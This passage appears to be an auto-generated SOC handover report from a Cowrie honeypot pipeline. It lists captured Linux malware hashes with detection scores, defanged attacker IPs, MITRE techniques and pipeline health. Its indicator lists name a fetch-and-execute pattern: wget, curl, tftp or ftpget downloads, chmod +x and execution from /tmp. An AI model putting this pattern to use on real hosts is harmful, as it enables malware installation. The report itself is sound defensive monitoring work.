| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **35/74** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 63/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `4756c00dfa749f3fdf3a687a464632d692da370fd159c78b3ed70cad32192555` | ELF Binary (Linux executable) (ARM 32-bit) | `4756c00dfa749f3f...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `51228996cf0280efc9b4c45d499e8527029667335b7b26951990feac7f22595a` | ELF Binary (Linux executable) (x86 32-bit) | `51228996cf0280ef...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `5348b12f049d86c5306ad9ea227b8483155183cb2a535c25b5c587c4c2491923` | ELF Binary (Linux executable) (x86-64 64-bit) | `5348b12f049d86c5...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `5850b6e589ea496b093b3c162dab126789ea118276bc3c23ff4cf75c6c19c8d5` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `5850b6e589ea496b...` | 55/100 | 🟡 MEDIUM | **37/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `136.116.189[.]132` | US | Google LLC | **100** ⚠️ | 3 |
| `183.171.15[.]68` | MY | Celcom Axiata Berhad | **100** ⚠️ | 17 |
| `120.194.50[.]39` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `124.239.129[.]2` | CN | CHINANET hebei province network | **100** ⚠️ | 50 |
| `181.212.174[.]164` | CL | TELEFONICA EMPRESAS CHILE SA | **100** ⚠️ | 4 |
| `129.153.145[.]135` | US | Oracle Corporation | **100** ⚠️ | 8 |
| `31.173.8[.]170` | RU | PJSC MegaFon | **100** ⚠️ | 50 |
| `118.122.196[.]230` | CN | CHINANET Sichuan province network | **100** ⚠️ | 50 |
| `117.160.131[.]100` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `51.158.205[.]203` | NL | Scaleway - Amsterdam, Netherlands | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 386 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 357 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 97 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 95 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 92 |

---

## 🔕 False Positive Summary (37 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 7 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 27 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 471 cases |
| Tool 34  | Credential Extractor        | ✅ 404 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 21 fingerprints |
| Tool 36  | Command Clustering          | ✅ 7 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 171 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 37 filtered (7.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 89 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 28 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 357 priority case(s) shown individually · 41 recon entry/entries in table (17 group(s) consolidating 53 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-24T10:23:35Z_
